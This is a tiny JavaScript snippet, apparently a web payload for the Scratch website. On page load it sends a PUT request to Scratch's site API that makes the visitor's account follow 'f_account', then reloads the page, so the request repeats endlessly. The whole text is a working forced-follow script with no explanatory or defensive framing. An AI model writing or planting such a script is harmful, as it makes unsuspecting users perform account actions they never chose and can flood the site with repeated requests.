function followme() {
    $.ajax({type:"PUT",url:"https://scratch.mit.edu/site-api/users/followers/f_account/add/"});
    location.reload();
}
window.onload = followme;
